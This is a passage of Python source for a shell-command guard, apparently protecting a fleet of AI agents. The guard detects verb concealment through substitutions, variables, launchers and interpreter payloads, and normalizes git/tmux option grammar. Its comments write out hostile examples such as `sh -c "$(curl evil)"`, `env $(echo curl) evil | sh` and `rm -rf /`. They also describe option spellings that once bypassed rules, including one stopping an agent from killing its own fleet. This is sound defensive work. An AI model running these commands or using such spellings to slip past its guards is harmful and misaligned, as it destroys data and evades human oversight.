# here is concealment of the verb one level down. Distinct from the
# ``_INTERPRETERS`` regex near the top of this file, which is a rule fragment.
_PAYLOAD_INTERPRETERS = _SHELL_NAMES | {
    "python", "python3", "perl", "ruby", "node", "php",
}

# An expansion whose value we could not resolve to a literal. ``$VAR`` matters
# as much as ``$(...)``: ``CMD=$(curl evil); $CMD`` conceals the verb via the
# variable, and a bare ``$CMD -rf /`` from the environment was never caught at
# all before this.
_UNRESOLVED_RE = re.compile(r"\$\{?\w|" + _SUBST)

# A payload that is ENTIRELY one expansion — ``sh -c "$CODE"``, ``sh -c "$1"``.
_WHOLLY_EXPANDED_RE = re.compile(r"^\s*(?:\$\{\w+\}|\$\w+|" + _SUBST + r")\s*$")


def _payload_is_concealed(payload: str) -> bool:
    """Is an interpreter's ``-c`` payload unknowable, or merely parameterised?

    The distinction is what separates a smuggled program from an ordinary one:

    * ``sh -c "$(curl evil)"`` / ``sh -c "$CODE"`` — the PROGRAM ITSELF arrives
      at runtime. Nothing about it is knowable. Concealed.
    * ``python3 -c "import json; open('logs/${f}.jsonl')"`` — the program is
      right there; ``${f}`` is a loop variable filling in a filename. Refusing
      this refuses ordinary scripting, and it was a real residual block in the
      06-24..08-05 replay (a loop over five character logs).

    So: a command substitution anywhere in the payload can inject arbitrary
    program text and is concealment; a bare ``$VAR`` is only concealment when it
    is the WHOLE payload.
    """
    return _SUBST in payload or bool(_WHOLLY_EXPANDED_RE.match(payload))


def split_substitutions(command: str) -> Tuple[str, List[str]]:
    """``(command with each substitution replaced by _SUBST, [inner commands])``.

    Depth-counted for ``$(...)`` so nesting survives, and single-quoted spans
    are skipped because no expansion happens inside them. Backticks are taken to
    the next backtick.

    Extracting the bodies is what makes narrowing the outer check safe: an
    operand substitution is allowed to be an operand, but whatever it RUNS is
    still scanned as a command.
    """
    out: List[str] = []
    inner: List[str] = []
    i, n = 0, len(command)
    while i < n:
        c = command[i]
        if c == "'":
            j = command.find("'", i + 1)
            j = n if j == -1 else j
            out.append(command[i:j + 1])
            i = j + 1
        elif c == "\\" and i + 1 < n:
            out.append(command[i:i + 2])
            i += 2
        elif c == "$" and command[i:i + 3] == "$((":
            # ARITHMETIC expansion, not command substitution. `$(( x - y ))`
            # evaluates numbers; it cannot run a verb, so treating it as a
            # concealed command is a false positive — and a real one: three of
            # the residual blocks in the 06-24..08-05 replay were
            # `[ $(( $(date +%s) - start )) -gt 90 ]` in a polling loop.
            # A `$(...)` nested INSIDE it is still a substitution, so the
            # interior is re-scanned rather than skipped.
            depth, j = 1, i + 3
            while j < n and depth:
                if command[j] == "(":
                    depth += 1
                elif command[j] == ")":
                    depth -= 1
                j += 1
            interior = command[i + 3:j - 1] if depth == 0 else command[i + 3:]
            _, nested = split_substitutions(interior)
            inner.extend(nested)
            out.append(_SUBST)
            i = j + 1 if j < n and command[j:j + 1] == ")" else j
        elif c == "$" and i + 1 < n and command[i + 1] == "(":
            depth, j = 1, i + 2
            while j < n and depth:
                if command[j] == "(":
                    depth += 1
                elif command[j] == ")":
                    depth -= 1
                j += 1
            body = command[i + 2:j - 1] if depth == 0 else command[i + 2:]
            inner.append(body)
            out.append(_SUBST)
            i = j
        elif c == "`":
            j = command.find("`", i + 1)
            body = command[i + 1:j] if j != -1 else command[i + 1:]
            inner.append(body)
            out.append(_SUBST)
            i = (j + 1) if j != -1 else n
        else:
            out.append(c)
            i += 1
    return "".join(out), inner


def _tokenize(command: str) -> Optional[List[List[str]]]:
    """Subcommands as raw token lists, or None if it cannot be tokenized."""
    try:
        lex = shlex.shlex(command, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        tokens = list(lex)
    except ValueError:
        return None
    subs, cur = [], []
    for tok in tokens:
        if tok in _SHELL_OPERATORS:
            if cur:
                subs.append(cur)
                cur = []
            continue
        cur.append(tok)
    if cur:
        subs.append(cur)
    return subs


# Shell keywords that open a compound command: the word AFTER them is the verb,
# so a substitution there is still command position, and these words being first
# must not be mistaken for the verb itself.
_KEYWORDS = {"do", "then", "else", "elif", "if", "while", "until", "!", "time",
             "{", "}", "(", ")"}

# Launchers that RUN their first non-option argument. The command they run is
# the real verb, so concealment has to be looked for THERE — the same "a prefix
# is phrasing, not the operation" lesson that the masked-rescan fix turned on.
# `env $(echo curl) evil | sh` conceals its verb exactly as `$(echo curl) …`
# does, and keying on word 0 alone missed it.
_LAUNCHERS = {"env", "nice", "nohup", "timeout", "stdbuf", "command", "xargs",
              "sudo", "doas", "uv", "uvx", "poetry", "npx", "pipx", "time",
              "setsid", "chrt", "ionice"}

# Sub-words a launcher takes before the command (``uv run …``, ``uv tool run …``).
_LAUNCHER_SUBWORDS = {"run", "tool", "exec", "--"}


def _effective_verb_index(tokens: List[str], start: int) -> int:
    """Index of the token that actually names the command, seeing past launchers.

    Skips the launcher itself plus its options, option-values, numeric
    arguments and sub-words (``timeout 5 …``, ``nice -n 5 …``, ``xargs -I{} …``,
    ``uv run …``), then repeats — bounded, since each pass consumes at least one
    token. Returns -1 when the subcommand is nothing but launchers.
    """
    i = start
    for _ in range(len(tokens)):
        if i >= len(tokens):
            return -1
        base = tokens[i].rsplit("/", 1)[-1]
        if base not in _LAUNCHERS:
            return i
        i += 1
        while i < len(tokens) and (
            tokens[i].startswith("-")
            or tokens[i].isdigit()
            or _ASSIGN_TOKEN_RE.match(tokens[i])
            or tokens[i] in _LAUNCHER_SUBWORDS
        ):
            i += 1
    return i if i < len(tokens) else -1


def detect_obfuscation(command: str) -> Optional[str]:
    """Return a reason string if ``command`` CONCEALS THE VERB it will run.

    Not "contains a substitution" — see the block comment above for why that cut
    is backwards. Returns None for a command whose verbs are all literal, even
    when its arguments are substitutions.
    """
    if _EVAL_RE.search(command):
        return "eval"
    if _BASE64_PIPE_RE.search(command):
        return "base64-decode pipeline"

    # A heredoc body is DATA, not a command — and its content routinely carries
    # unmatched quotes (an HTML email, a markdown review). Tokenizing it read as
    # "unbalanced quotes" and failed closed: four of the residual blocks in the
    # 06-24..08-05 replay were `cat > file <<'EOF'` with an HTML body. Stripped
    # for tokenization only, matching what ``masked_subcommands`` already does;
    # the raw command remains a haystack, so a body fed to a shell is still
    # matched by the unanchored rules exactly as before.
    masked, inner = split_substitutions(_strip_heredoc_bodies(command))

    # Only assignments to a LITERAL value count as resolving a variable.
    # `CMD=$(echo rm); $CMD -rf /` assigns CMD, so a membership test on the
    # name alone reports it resolved and lets the concealed verb through —
    # the variable is precisely how the concealment travels.
    assigns = {
        m.group(1) for m in _ASSIGN_RE.finditer(command)
        if not _UNRESOLVED_RE.search(m.group(2))
        and not _SUBSTITUTION_RE.search(m.group(2))
    }

    subcommands = _tokenize(masked)
    if subcommands is None:
        return "unbalanced quotes"

    for tokens in subcommands:
        # The verb is the first token that isn't a keyword or a leading
        # VAR=value assignment...
        verb_idx = 0
        while verb_idx < len(tokens) and (
            tokens[verb_idx] in _KEYWORDS or _ASSIGN_TOKEN_RE.match(tokens[verb_idx])
        ):
            verb_idx += 1
        if verb_idx >= len(tokens):
            continue
        # ...and then not a launcher standing in front of the real one.
        verb_idx = _effective_verb_index(tokens, verb_idx)
        if verb_idx < 0:
            continue
        verb = tokens[verb_idx]
        if _SUBST in verb:
            return "concealed command"
        # A ``$VAR`` verb is concealed unless a literal assignment in this same
        # command resolved it (``normalize_subcommands`` does that resolution;
        # anything it could not resolve is unknowable here).
        m = re.match(r"^\$\{?(\w+)", verb)
        if m and m.group(1) not in assigns:
            return "concealed command"

        # A concealed payload to an interpreter is the same thing one level down.
        base = verb.rsplit("/", 1)[-1]
        if base in _PAYLOAD_INTERPRETERS:
            for k in range(verb_idx + 1, len(tokens) - 1):
                flag = tokens[k]
                if flag.startswith("-") and ("c" in flag or "e" in flag):
                    if _payload_is_concealed(tokens[k + 1]):
                        return "concealed shell payload"
                    break

    # A substitution body is a command too — recurse, so concealment nested
    # inside an operand still fires.
    for body in inner:
        reason = detect_obfuscation(body)
        if reason:
            return reason
    return None


def normalize_subcommands(command: str) -> Tuple[List[str], Optional[str]]:
    """Tokenize ``command`` and return ``(normalized_subcommands, ambiguous)``.

    ``normalized_subcommands`` is the per-subcommand argv re-joined with single
    spaces, after ``shlex`` has stripped quotes/escapes and simple ``$VAR``
    assignments earlier in the same command have been resolved. ``ambiguous`` is
    a reason string when the command CONCEALS THE VERB it will run (and the
    caller should fail closed); it is ``None`` on success.

    Substitutions no longer abort normalization (#925). They are replaced by an
    opaque sentinel so the surrounding command tokenizes as usual, and each
    substitution BODY is normalized in its own right and appended — additive,
    never in place, so ``echo "$(rm -rf /)"`` is judged on the delete rule it
    actually runs. Before this, a substitution anywhere returned NO subcommands
    at all, which meant every normalized-form rule went blind and the command's
    only verdict came from this fail-closed path.
    """
    obf = detect_obfuscation(command)
    if obf:
        return [], obf

    # Heredoc bodies stripped for the same reason as in ``detect_obfuscation``
    # and ``masked_subcommands``: the body is data, its unmatched quotes are not
    # a tokenization failure, and the raw command stays a haystack regardless.
    # Without this, every `cat > file <<'EOF'` carrying HTML or markdown failed
    # closed on "unbalanced quotes" — the last four residual blocks in the
    # 06-24..08-05 replay were exactly that.
    masked, inner = split_substitutions(_strip_heredoc_bodies(command))

    # Resolve simple ``VAR=value`` assignments so ``R=rm; $R -rf`` normalizes to
    # ``rm -rf``. Only literal values (no nested expansion) are resolved.
    assigns: Dict[str, str] = {}
    for m in _ASSIGN_RE.finditer(command):
        assigns[m.group(1)] = m.group(2).strip("'\"")

    try:
        lex = shlex.shlex(masked, posix=True, punctuation_chars=True)
        lex.whitespace_split = True
        tokens = list(lex)
    except ValueError:
        return [], "unbalanced quotes"

    def _resolve(tok: str) -> str:
        for name, val in assigns.items():
            tok = tok.replace("${%s}" % name, val).replace("$" + name, val)
        return tok

    subs: List[str] = []
    cur: List[str] = []
    for tok in tokens:
        if tok in _SHELL_OPERATORS:
            if cur:
                subs.append(" ".join(cur))
                cur = []
            continue
        cur.append(_resolve(tok))
    if cur:
        subs.append(" ".join(cur))

    for body in inner:
        body_subs, _ = normalize_subcommands(body)
        subs.extend(body_subs)
    return subs, None


#
# CONTENT MASKING (#675)
#
# Tooldef rules are COMMAND-PREFIX rules (``\bgh\s+pr\s+comment\b``), but the
# haystacks above include quoted argument text — so a commit message that
# merely *mentions* "gh pr comment" false-matches the rule. Anchored rules are
# therefore matched against MASKED subcommands instead: quoted spans that can
# only be content (a quoted token containing whitespace — a message, an echo
# string, a heredoc body) are replaced with a placeholder, while quoted
# single words are kept (``"gh" pr comment`` is still a real command) and
# ``sh -c "…"`` payloads are recursively re-scanned as commands.

_MASK = "\x00"
_HEREDOC_RE = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_]\w+)\1")


#
# GLOBAL OPTIONS BEFORE THE SUBCOMMAND (#913 for git, #919 for the class)
#
# Every rule that names a tool — both the hand-written ``bashToolPatterns`` in
# the rule YAMLs (``\bgit\s+push\s+--force\b``, ``\btmux\s+kill-server\b``) and
# the tooldef-generated ones from ``_cmd_to_regex`` (``\bgit\s+commit\b``) —
# assumes the subcommand sits adjacent to the tool name. It doesn't have to:
# ``git -C <dir> <cmd>`` is the idiomatic way to operate on a repo without
# ``cd``, and ``\s+`` cannot span ``-C /repo``. That single assumption defeated
# EVERY git rule (#913), and then every rule for fourteen more tools (#919) —
# including ``tmux -L agentwire kill-server``, whose rule exists to stop an
# agent destroying the fleet it is running inside, and the
# production-TARGETING options of aws/kubectl/docker/redis-cli, where the guard
# held for the default target and dropped for the named remote one.
#
# ONE normalizer, driven by a DATA TABLE. Not a generalized regex (a guess
# about grammars nobody measured) and not fifteen per-tool normalizers (that is
# "model each wrapper's own grammar", the mistake #918 declined to make, at one
# remove). Adding a sixteenth tool is a table row.
#
# This is strictly ADDITIVE — the un-stripped forms stay in the haystack list.
# A rule that legitimately cares WHICH repo/cluster/profile is being targeted
# (a path rule, an allowlist check) still sees ``-C /repo`` in the raw command;
# stripping can only ever remove tokens, so the extra variant can introduce no
# path a rule didn't already see.
#
# PROVENANCE IS PART OF THE ROW, because both directions of a wrong arity guess
# FAIL OPEN and neither is visible:
#
#   marked value-taking but actually bare -> the SUBCOMMAND is eaten  -> allow
#   marked bare but actually value-taking -> the VALUE stays inline   -> allow
#
# There is no conservative direction to lean, and a wrong row never surfaces as
# a spurious block — only as an ALLOW where a corpus row expected a block, and
# only if that corpus row exists. So an unverified row cannot be made safe,
# only HONEST: every row names how its grammar was established, and
# ``test_every_table_row_has_corpus_coverage`` fails a row that no command in
# the acceptance corpus would contradict.

_MEASURED = "measured"      # probed against the real binary, version recorded
_DOCUMENTED = "documented"  # binary not runnable here; from the official docs


def _grammar(
    provenance: str,
    version: str,
    value: Tuple[str, ...] = (),
    flag: Tuple[str, ...] = (),
    value_eq_only: Tuple[str, ...] = (),
    short_cluster: bool = False,
    plus_selector: bool = False,
) -> Dict[str, Any]:
    """One tool's global-option grammar.

    ``value``          option consumes a SEPARATE following argument (the ``=``
                       form is handled generically for these too).
    ``flag``           stands alone, consumes nothing.
    ``value_eq_only``  ONLY the ``--opt=value`` form exists (terraform's
                       ``-chdir=DIR``); a bare one must not eat the next token.
    ``short_cluster``  getopt/pflag-style short options: ``-Lname`` (attached)
                       and ``-2Lname`` (bundled) are accepted. THIS IS PER
                       TOOL, not a global convention: git REJECTS ``-C/tmp``
                       (measured), which is why #918 could ignore attached
                       forms — correct for git and wrong for tmux, where the
                       fleet-kill bypass has three spellings, not one.
    ``plus_selector``  a leading ``+token`` selector (cargo's ``+nightly``).
    ``provenance``     ``_MEASURED`` or ``_DOCUMENTED`` — see the note above;
                       required, because an unmarked row is the failure mode.
    """
    return {
        "value": frozenset(value),
        "flag": frozenset(flag),
        "value_eq_only": frozenset(value_eq_only),
        "short_cluster": short_cluster,
        "plus_selector": plus_selector,
        "provenance": provenance,
        "version": version,
    }


